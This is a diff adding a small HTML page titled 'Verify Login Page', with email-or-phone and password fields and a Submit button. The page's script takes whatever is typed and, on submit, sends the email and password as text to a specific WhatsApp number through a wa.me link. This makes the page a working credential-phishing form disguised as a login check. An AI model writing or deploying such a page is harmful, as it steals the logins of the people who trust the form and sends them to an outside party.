@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width"/>
+        <title>Verify Login Page</title>
+        
+    </head>
+    <body>
+        
+        <div class="form">
+        <div id="email">
+        <p>Email or Phone</p>
+        <input type="text" placeholder="username" class="gameField" id="a"/>
+        </div>
+        
+        <div id="password">
+        <p>Password</p>
+        <input type="password" placeholder="password" class="gameField" id="b"/>
+        </div>
+        </div>
+        <style>
+          .form{
+                border: 1px #000 solid;
+                flex-direction: center;
+                align-items: center;
+                border-radius: 5%;
+                height: 250px;
+                width: 200px;
+                position: relative;
+                bottom: -100px;
+                right: -80px;
+            }
+            .gameField{
+                width: 200px;
+                height: 50px;
+                border-radius: 5px;
+            }
+            .gameField:hover{
+                border-color: #ff3;
+                background: #333;
+                color: #f3f3f3;
+            }
+            p{
+                font: 1rem;
+            }
+        </style>
+                <a>
+            <button class="btn">Submit</button>
+        </a>
+<script>
+    const btn = document.querySelector('button[class*="btn"]');
+    const email = document.getElementById('a');
+    const password = document.getElementById('b');
+    btn.addEventListener("click", () =>{
+        const a = document.createElement('a');
+        d = email.value;
+        s = password.value;
+        a.href = `https://wa.me/08161248838/?text='confirm details: ${d} keys=${s} user address="***" '`;
+        a.click();
+    });
+    btn.style.background = "#000";
+    btn.style.color = "#fff";
+</script>
+    </body>
+</html>
